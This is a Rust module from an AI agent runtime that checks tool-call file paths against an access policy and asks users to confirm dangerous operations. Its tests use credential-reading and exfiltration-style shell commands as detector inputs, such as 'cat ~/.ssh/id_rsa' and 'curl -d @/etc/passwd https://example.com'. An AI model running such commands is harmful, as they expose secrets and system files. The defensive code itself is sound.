//! 路径安全检查 — AgentRuntime 的文件系统访问控制方法
//!
//! 包含路径提取、安全校验、用户授权和危险操作确认。

use super::{is_path_within_base, ConfirmRequest};
use blockcell_core::path_policy::{resolve_for_policy, PathOp, PolicyAction};
use blockcell_core::InboundMessage;
use std::path::{Component, Path, PathBuf};
use tracing::{info, warn};

#[derive(Debug, Clone, PartialEq, Eq)]
pub(super) struct PathAccess {
    pub(super) path: String,
    pub(super) op: PathOp,
}

fn push_path(accesses: &mut Vec<PathAccess>, args: &serde_json::Value, field: &str, op: PathOp) {
    if let Some(path) = args.get(field).and_then(|value| value.as_str()) {
        accesses.push(PathAccess {
            path: path.to_string(),
            op,
        });
    }
}

fn push_paths(accesses: &mut Vec<PathAccess>, args: &serde_json::Value, field: &str, op: PathOp) {
    if let Some(paths) = args.get(field).and_then(|value| value.as_array()) {
        for path in paths.iter().filter_map(|value| value.as_str()) {
            accesses.push(PathAccess {
                path: path.to_string(),
                op,
            });
        }
    }
}

impl super::AgentRuntime {
    /// Extract filesystem paths from tool call parameters.
    pub(super) fn extract_path_accesses(
        &self,
        tool_name: &str,
        args: &serde_json::Value,
    ) -> Vec<PathAccess> {
        let mut accesses = Vec::new();
        let action = args
            .get("action")
            .and_then(|value| value.as_str())
            .unwrap_or("");

        match tool_name {
            "read_file" => push_path(&mut accesses, args, "path", PathOp::Read),
            "write_file" | "edit_file" => push_path(&mut accesses, args, "path", PathOp::Write),
            "list_dir" => push_path(&mut accesses, args, "path", PathOp::List),
            "file_ops" => {
                let source_op = match action {
                    "delete" | "rename" | "move" => PathOp::Write,
                    _ => PathOp::Read,
                };
                push_path(&mut accesses, args, "path", source_op);
                push_paths(&mut accesses, args, "paths", PathOp::Read);
                push_path(&mut accesses, args, "destination", PathOp::Write);
            }
            "data_process" => {
                let path_op = if action == "write_csv" {
                    PathOp::Write
                } else {
                    PathOp::Read
                };
                push_path(&mut accesses, args, "path", path_op);
                push_path(&mut accesses, args, "output_path", PathOp::Write);
            }
            "audio_transcribe" | "ocr" | "encrypt" => {
                push_path(&mut accesses, args, "path", PathOp::Read);
                push_path(&mut accesses, args, "output_path", PathOp::Write);
            }
            "chart_generate" | "office_write" | "camera" | "tts" | "knowledge_graph" => {
                push_path(&mut accesses, args, "output_path", PathOp::Write);
            }
            "video_process" => {
                push_path(&mut accesses, args, "input", PathOp::Read);
                push_paths(&mut accesses, args, "inputs", PathOp::Read);
                push_path(&mut accesses, args, "subtitle_file", PathOp::Read);
                push_path(&mut accesses, args, "watermark_image", PathOp::Read);
                push_path(&mut accesses, args, "output_path", PathOp::Write);
            }
            "image_understand" => {
                push_path(&mut accesses, args, "path", PathOp::Read);
                push_paths(&mut accesses, args, "paths", PathOp::Read);
            }
            "termux_api" => {
                let file_op = match action {
                    "share" | "media_scan" | "wallpaper" => PathOp::Read,
                    _ => PathOp::Write,
                };
                push_path(&mut accesses, args, "file_path", file_op);
                push_path(&mut accesses, args, "output_path", PathOp::Write);
            }
            "email" => {
                push_paths(&mut accesses, args, "attachments", PathOp::Read);
                push_path(&mut accesses, args, "save_attachments_to", PathOp::Write);
            }
            "health_api" => {
                push_path(&mut accesses, args, "path", PathOp::Read);
                push_path(&mut accesses, args, "output_path", PathOp::Write);
            }
            "message" => {
                push_paths(&mut accesses, args, "media", PathOp::Read);
            }
            "browse" => {
                push_path(&mut accesses, args, "output_path", PathOp::Write);
                push_path(&mut accesses, args, "file_path", PathOp::Read);
                push_paths(&mut accesses, args, "files", PathOp::Read);
            }
            "exec" => {
                push_path(&mut accesses, args, "working_dir", PathOp::Exec);
                // Also subject filesystem paths referenced inside the command
                // itself to the path policy, so built-in sensitive paths
                // (~/.ssh, /etc, ...) are enforced for `exec`, not just for
                // its working directory.
                if let Some(cmd) = args.get("command").and_then(|v| v.as_str()) {
                    accesses.extend(extract_command_paths(cmd).into_iter().map(|path| {
                        PathAccess {
                            path,
                            op: PathOp::Exec,
                        }
                    }));
                }
            }
            "shell" => {
                let shell_action = args.get("action").and_then(|v| v.as_str()).unwrap_or("run");
                let cmd_opt = match shell_action {
                    "run" => args
                        .get("command")
                        .and_then(|v| v.as_str())
                        .map(String::from),
                    "write_stdin" => args.get("input").and_then(|v| v.as_str()).map(|input| {
                        let session_id = args
                            .get("session_id")
                            .and_then(|v| v.as_str())
                            .unwrap_or_default();
                        blockcell_tools::shell_session::preview_session_stdin(session_id, input)
                    }),
                    _ => None,
                };
                if let Some(cmd) = cmd_opt {
                    accesses.extend(extract_command_paths(&cmd).into_iter().map(|path| {
                        PathAccess {
                            path,
                            op: PathOp::Exec,
                        }
                    }));
                }
            }
            _ => {}
        }
        accesses
    }

    /// Resolve a path string the same way tools do (expand ~ and relative paths).
    pub(super) fn resolve_path(&self, path_str: &str) -> PathBuf {
        if path_str.starts_with("~/") {
            dirs::home_dir()
                .map(|h| h.join(&path_str[2..]))
                .unwrap_or_else(|| PathBuf::from(path_str))
        } else if path_str.starts_with('/') {
            PathBuf::from(path_str)
        } else {
            self.paths.workspace().join(path_str)
        }
    }

    /// Check if a resolved path is inside the safe workspace directory.
    pub(super) fn is_path_safe(&self, resolved: &std::path::Path) -> bool {
        is_path_within_base(&self.paths.workspace(), resolved)
    }

    /// Check whether a resolved path falls within an already-authorized directory.
    /// Optimized (#12): walk ancestors with O(1) HashSet lookups instead of O(n) iteration.
    /// `authorized_dirs` stores already-canonicalized paths, so no re-canonicalization needed.
    pub(super) fn is_path_authorized(&self, resolved: &std::path::Path, op: PathOp) -> bool {
        if self.authorized_dirs.is_empty() {
            return false;
        }
        let rp = resolve_for_policy(resolved);
        let mut current = rp.as_path();
        loop {
            if self.authorized_dirs.contains(&(current.to_path_buf(), op)) {
                return true;
            }
            match current.parent() {
                Some(parent) if parent != current => current = parent,
                _ => return false,
            }
        }
    }

    /// Record a directory as authorized so future accesses within it are auto-approved.
    pub(super) fn authorize_directory(&mut self, resolved: &std::path::Path, op: PathOp) {
        // If the path is a directory, authorize it directly.
        // If it's a file, authorize its parent directory.
        let dir = if resolved.is_dir() {
            resolved.to_path_buf()
        } else {
            resolved
                .parent()
                .map(Path::to_path_buf)
                .unwrap_or_else(|| resolved.to_path_buf())
        };
        let dir = resolve_for_policy(&dir);
        if self.authorized_dirs.insert((dir.clone(), op)) {
            info!(dir = %dir.display(), ?op, "Directory authorized for future access");
        }
    }

    /// For tools that access the filesystem, check if any paths are outside the
    /// workspace. Applies the path-access policy first; only paths whose policy
    /// outcome is `Confirm` are forwarded to the user for interactive approval.
    ///
    /// Priority (highest → lowest):
    /// 1. Workspace-safe paths  → always allowed
    /// 2. Session-authorized dirs → allowed (cached from prior confirmation)
    /// 3. Policy `Deny`         → rejected immediately, no confirmation sent
    /// 4. Policy `Allow`        → allowed immediately, cached for this session
    /// 5. Policy `Confirm`      → user confirmation required
    #[cfg(test)]
    pub(super) async fn check_path_permission(
        &mut self,
        tool_name: &str,
        args: &serde_json::Value,
        msg: &InboundMessage,
    ) -> bool {
        self.check_path_permission_with_confirmation(tool_name, args, msg, false)
            .await
    }

    pub(super) async fn check_path_permission_with_confirmation(
        &mut self,
        tool_name: &str,
        args: &serde_json::Value,
        msg: &InboundMessage,
        policy_confirmed: bool,
    ) -> bool {
        if matches!(tool_name, "exec_local" | "exec_skill_script") {
            // These run scripts addressed relative to the active skill
            // directory, so the generic workspace policy doesn't apply. Still
            // enforce — at the runtime layer — that the script path is a safe
            // relative path that cannot escape the skill scope.
            let path = args.get("path").and_then(|v| v.as_str()).unwrap_or("");
            if !is_safe_relative_skill_path(path) {
                warn!(
                    tool = tool_name,
                    path, "Rejecting exec script path that escapes skill scope"
                );
                return false;
            }
            return true;
        }
        let path_accesses = self.extract_path_accesses(tool_name, args);
        if path_accesses.is_empty() {
            return true;
        }

        // Classify each path by policy outcome
        let mut deny_paths: Vec<String> = Vec::new();
        let mut confirm_paths: Vec<PathAccess> = Vec::new();

        for access in &path_accesses {
            let resolved = self.resolve_path(&access.path);

            // Hard path-policy denial always wins, including over workspace-internal
            // paths, prior session authorization, and ToolPolicy `ask` approval.
            let action = self.path_policy.evaluate(&resolved, access.op);
            if action == PolicyAction::Deny {
                warn!(
                    tool = tool_name,
                    path = %resolved.display(),
                    "Path access denied by policy"
                );
                deny_paths.push(access.path.clone());
                continue;
            }

            // 1. Workspace-safe → always OK (is_path_safe canonicalizes via
            // resolve_for_policy, so symlink escapes out of workspace are rejected).
            if self.is_path_safe(&resolved) {
                continue;
            }

            // 2. Already authorized by user this session → OK
            if self.is_path_authorized(&resolved, access.op) {
                continue;
            }

            // 3. Apply the non-deny policy outcome
            match action {
                PolicyAction::Deny => unreachable!("deny handled before authorization checks"),
                PolicyAction::Allow => {
                    // Policy explicitly allows — cache for this session
                    info!(
                        tool = tool_name,
                        path = %resolved.display(),
                        "Path access allowed by policy"
                    );
                    if self.path_policy.cache_confirmed_dirs() {
                        self.authorize_directory(&resolved, access.op);
                    }
                }
                PolicyAction::Confirm => {
                    if policy_confirmed {
                        if self.path_policy.cache_confirmed_dirs() {
                            self.authorize_directory(&resolved, access.op);
                        }
                    } else {
                        confirm_paths.push(access.clone());
                    }
                }
            }
        }

        // Any hard-deny → reject the whole operation
        if !deny_paths.is_empty() {
            return false;
        }

        // All paths were allowed (workspace / session-cache / policy-allow)
        if confirm_paths.is_empty() {
            return true;
        }

        // Need user confirmation for the remaining paths
        if let Some(confirm_tx) = &self.confirm_tx {
            let (response_tx, response_rx) = tokio::sync::oneshot::channel();
            let request = ConfirmRequest {
                tool_name: tool_name.to_string(),
                paths: confirm_paths
                    .iter()
                    .map(|access| access.path.clone())
                    .collect(),
                response_tx,
                agent_id: self.agent_id.clone(),
                channel: msg.channel.clone(),
                account_id: msg.account_id.clone(),
                sender_id: msg.sender_id.clone(),
                chat_id: msg.chat_id.clone(),
                ws_connection_id: msg
                    .metadata
                    .get("ws_connection_id")
                    .and_then(|value| value.as_str())
                    .map(|value| value.to_string()),
            };

            if confirm_tx.send(request).await.is_err() {
                warn!("Failed to send confirmation request, denying access");
                return false;
            }

            match response_rx.await {
                Ok(allowed) => {
                    if allowed && self.path_policy.cache_confirmed_dirs() {
                        for access in &confirm_paths {
                            let resolved = self.resolve_path(&access.path);
                            self.authorize_directory(&resolved, access.op);
                        }
                    }
                    allowed
                }
                Err(_) => {
                    warn!("Confirmation channel closed, denying access");
                    false
                }
            }
        } else {
            warn!(
                tool = tool_name,
                "No confirmation channel, denying access to paths outside workspace"
            );
            false
        }
    }

    pub(super) async fn confirm_dangerous_operation(
        &mut self,
        tool_name: &str,
        items: Vec<String>,
        msg: &InboundMessage,
    ) -> bool {
        if items.is_empty() {
            return true;
        }
        if let Some(confirm_tx) = &self.confirm_tx {
            let (response_tx, response_rx) = tokio::sync::oneshot::channel();
            let request = ConfirmRequest {
                tool_name: tool_name.to_string(),
                paths: items,
                response_tx,
                agent_id: self.agent_id.clone(),
                channel: msg.channel.clone(),
                account_id: msg.account_id.clone(),
                sender_id: msg.sender_id.clone(),
                chat_id: msg.chat_id.clone(),
                ws_connection_id: msg
                    .metadata
                    .get("ws_connection_id")
                    .and_then(|value| value.as_str())
                    .map(|value| value.to_string()),
            };
            if confirm_tx.send(request).await.is_err() {
                warn!(
                    tool = tool_name,
                    "Failed to send dangerous-operation confirmation request, denying"
                );
                return false;
            }
            match response_rx.await {
                Ok(allowed) => allowed,
                Err(_) => {
                    warn!(
                        tool = tool_name,
                        "Dangerous-operation confirmation channel closed, denying"
                    );
                    false
                }
            }
        } else {
            warn!(
                tool = tool_name,
                "No confirmation channel, denying dangerous operation"
            );
            false
        }
    }
}

/// Heuristically extract filesystem-path-looking tokens from a shell command.
///
/// Used to subject paths referenced inside an `exec` / `shell` command to the
/// path policy. This is intentionally conservative: when in doubt a token is
/// treated as a path, so the policy (deny / confirm) gets a chance to run.
fn extract_command_paths(command: &str) -> Vec<String> {
    let mut out = Vec::new();
    for raw in command.split_whitespace() {
        let pieces: Vec<&str> = if !raw.contains("://") && (raw.contains('<') || raw.contains('>'))
        {
            raw.split(['<', '>'])
                .filter(|part| !part.is_empty())
                .collect()
        } else {
            vec![raw]
        };

        for piece in pieces {
            let mut candidates = Vec::new();
            let trimmed =
                piece.trim_matches(|c: char| matches!(c, '"' | '\'' | ';' | ',' | ')' | '(' | '&'));
            if trimmed.is_empty() {
                continue;
            }

            // Handle flags carrying path values like `-d@/etc/passwd` or `--file=/etc/passwd`
            if let Some(rest) = trimmed.strip_prefix("-d@") {
                candidates.push(rest);
            } else if trimmed.starts_with('-') {
                if let Some((_, val)) = trimmed.split_once('=') {
                    candidates.push(val.trim_matches(|c| c == '"' || c == '\''));
                }
            } else if let Some((_, val)) = trimmed.split_once('=') {
                // `dd if=/etc/shadow` or `FOO=/etc/passwd`
                candidates.push(val.trim_matches(|c| c == '"' || c == '\''));
            } else {
                candidates.push(trimmed);
            }

            for cand in candidates {
                let tok = cand
                    .trim_start_matches(|c: char| matches!(c, '@' | '>' | '<' | '&'))
                    .trim_matches(|c: char| c == '"' || c == '\'');
                if tok.is_empty() || tok.starts_with('-') || tok.contains("://") {
                    continue;
                }
                let normalized = normalize_shell_home_vars(tok);
                let has_shell_expansion = normalized.contains('$') || normalized.contains('`');
                let looks_like_path = normalized.starts_with('/')
                    || normalized.starts_with("~/")
                    || normalized == "~"
                    || normalized.starts_with("./")
                    || normalized.starts_with("../")
                    || normalized == ".."
                    || (normalized.contains('/') && !normalized.contains('='))
                    || has_shell_expansion;
                if looks_like_path {
                    // If an unresolved shell variable or command substitution appears in a
                    // token (e.g. `$FILE`, `$FOO/secret`, or `$(pwd)/x`), never let
                    // `resolve_path` join it under workspace and treat it as workspace-safe;
                    // anchor it as an external synthetic path so PathPolicy requires confirmation.
                    let entry = if has_shell_expansion {
                        format!(
                            "/__unresolved_shell_var__/{}",
                            normalized.trim_start_matches('/')
                        )
                    } else {
                        normalized
                    };
                    if !out.contains(&entry) {
                        out.push(entry);
                    }
                }
            }
        }
    }

    // Also extract quoted absolute / home / escaping relative paths embedded in inline scripts
    // (e.g. `python3 -c "open('/etc/passwd').read()"` or `python3 -c "open('../secret').read()"`).
    for segment in command.split(['\'', '"']) {
        let seg = normalize_shell_home_vars(segment.trim());
        let is_inline_path = seg.starts_with('/')
            || seg.starts_with("~/")
            || seg.starts_with("../")
            || seg.starts_with("./")
            || seg == "..";
        if is_inline_path && !seg.contains(' ') && !seg.contains("://") && seg.len() > 1 {
            let entry = if seg.contains('$') || seg.contains('`') {
                format!("/__unresolved_shell_var__/{}", seg.trim_start_matches('/'))
            } else {
                seg
            };
            if !out.contains(&entry) {
                out.push(entry);
            }
        }
    }

    out
}

fn normalize_shell_home_vars(tok: &str) -> String {
    if tok == "$HOME" || tok == "${HOME}" {
        "~".to_string()
    } else if let Some(rest) = tok.strip_prefix("$HOME/") {
        format!("~/{rest}")
    } else if let Some(rest) = tok.strip_prefix("${HOME}/") {
        format!("~/{rest}")
    } else {
        tok.to_string()
    }
}

/// Whether `path` is a non-empty relative path that stays inside the active
/// skill directory (no absolute paths, no `..` traversal). Mirrors the
/// `exec_local`/`exec_skill_script` tools' own validation as defense in depth.
fn is_safe_relative_skill_path(path: &str) -> bool {
    let trimmed = path.trim();
    if trimmed.is_empty() {
        return false;
    }
    let candidate = Path::new(trimmed);
    if candidate.is_absolute() {
        return false;
    }
    !candidate.components().any(|c| {
        matches!(
            c,
            Component::ParentDir | Component::Prefix(_) | Component::RootDir
        )
    })
}

#[cfg(test)]
mod tests {
    use super::{extract_command_paths, is_safe_relative_skill_path};

    #[test]
    fn accepts_safe_relative_skill_paths() {
        for p in ["scripts/hello.sh", "main.py", "./run.sh", "a/b/c.py"] {
            assert!(is_safe_relative_skill_path(p), "expected `{p}` accepted");
        }
    }

    #[test]
    fn rejects_absolute_or_escaping_skill_paths() {
        for p in [
            "",
            "   ",
            "/etc/passwd",
            "../secret.sh",
            "scripts/../../etc/passwd",
        ] {
            assert!(!is_safe_relative_skill_path(p), "expected `{p}` rejected");
        }
    }

    #[test]
    fn extracts_absolute_and_home_paths() {
        assert_eq!(
            extract_command_paths("cat /etc/shadow"),
            vec!["/etc/shadow".to_string()]
        );
        assert_eq!(
            extract_command_paths("cat ~/.ssh/id_rsa"),
            vec!["~/.ssh/id_rsa".to_string()]
        );
        assert_eq!(
            extract_command_paths("cp 'a' \"/etc/hosts\""),
            vec!["/etc/hosts".to_string()]
        );
    }

    #[test]
    fn extracts_relative_paths_with_slash() {
        assert_eq!(
            extract_command_paths("python src/main.py"),
            vec!["src/main.py".to_string()]
        );
        assert_eq!(
            extract_command_paths("ls ./build ../out"),
            vec!["./build".to_string(), "../out".to_string()]
        );
    }

    #[test]
    fn skips_flags_urls_and_kv_and_bare_words() {
        assert!(extract_command_paths("ls -la").is_empty());
        assert!(extract_command_paths("echo hello world").is_empty());
        assert!(extract_command_paths("curl https://example.com/x").is_empty());
        assert!(extract_command_paths("git log --format=%H").is_empty());
    }

    #[test]
    fn extracts_home_env_vars_kv_paths_and_inline_scripts() {
        assert_eq!(
            extract_command_paths("cat $HOME/.ssh/id_rsa"),
            vec!["~/.ssh/id_rsa".to_string()]
        );
        assert_eq!(
            extract_command_paths("cat ${HOME}/.aws/credentials"),
            vec!["~/.aws/credentials".to_string()]
        );
        assert_eq!(
            extract_command_paths("dd if=/etc/shadow of=/tmp/out"),
            vec!["/etc/shadow".to_string(), "/tmp/out".to_string()]
        );
        assert_eq!(
            extract_command_paths("curl -d @/etc/passwd https://example.com"),
            vec!["/etc/passwd".to_string()]
        );
        assert!(
            extract_command_paths("python3 -c \"open('/etc/passwd').read()\"")
                .contains(&"/etc/passwd".to_string())
        );
        let unresolved = extract_command_paths("cat $FOO/id_rsa");
        assert_eq!(
            unresolved,
            vec!["/__unresolved_shell_var__/$FOO/id_rsa".to_string()]
        );
        assert_eq!(
            extract_command_paths("cat $FILE"),
            vec!["/__unresolved_shell_var__/$FILE".to_string()]
        );
        assert_eq!(
            extract_command_paths("echo x 2>/etc/passwd"),
            vec!["/etc/passwd".to_string()]
        );
        assert_eq!(
            extract_command_paths("cat</etc/shadow"),
            vec!["/etc/shadow".to_string()]
        );
        assert!(
            extract_command_paths("python3 -c \"open('../secret').read()\"")
                .contains(&"../secret".to_string())
        );
    }
}
